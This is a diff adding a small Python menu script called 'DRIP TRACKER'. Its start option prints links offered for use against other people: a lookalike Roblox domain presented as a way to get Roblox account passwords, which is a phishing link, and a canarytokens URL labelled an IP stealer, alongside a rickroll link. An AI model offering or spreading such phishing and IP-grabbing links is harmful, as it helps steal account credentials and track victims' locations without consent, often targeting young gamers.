@@ -1,0 +1,60 @@
+def main_menu():
+  print("""
+ _____  _____  _____ _____    _______ _____            _____ _  ________ _____  
+|  __ \|  __ \|_   _|  __ \  |__   __|  __ \     /\   / ____| |/ /  ____|  __ \ 
+| |  | | |__) | | | | |__) |    | |  | |__) |   /  \ | |    | ' /| |__  | |__) |
+| |  | |  _  /  | | |  ___/     | |  |  _  /   / /\ \| |    |  < |  __| |  _  / 
+| |__| | | \ \ _| |_| |         | |  | | \ \  / ____ \ |____| . \| |____| | \ \ 
+|_____/|_|  \_\_____|_|         |_|  |_|  \_\/_/    \_\_____|_|\_\______|_|  \_
+
+                                  By DRIP
+  """)
+
+  print("[1] Start")
+  print("[2] More")
+  print("[3] How to:")
+
+  choice = input("Answer with number: ")
+  handle_choice(choice)
+
+def handle_choice(choice):
+  if choice == "1":
+      start_program()
+  elif choice == "2":
+      show_more_info()
+  elif choice == "3":
+      show_how_to()
+  else:
+      print("Invalid choice, please select a valid option.")
+
+def start_program():
+  print("")
+  print("Starting the program...")
+  print("")
+  print ("blogs.mtdv.me/blog/posts/Instagram_me")
+  print("Rick Roll Link")
+  print("")
+  print("")
+     #Roblox password
+  print("https://uww-roblox.com/users/5065839840/profile")
+  print("to get the password of Roblox accounts")
+  print("")
+  print("")
+    #IP
+  print("http://canarytokens.com/terms/bmg0c65xhrku9u1ssret81ze3/contact.php")
+  print("This is an IP stealer")
+  print("")
+  print("")
+  # Add functionality for starting your program here
+def show_more_info():
+  print("This is a tool that provides useful information and resources.")
+  print("More features will be added in future versions. Stay tuned!")
+
+def show_how_to():
+  print("Welcome to the tutorial!")
+  print("1. Choose a number from the menu.")
+  print("2. Follow the instructions provided for the chosen option.")
+
+if __name__ == "__main__":
+  main_menu()
+
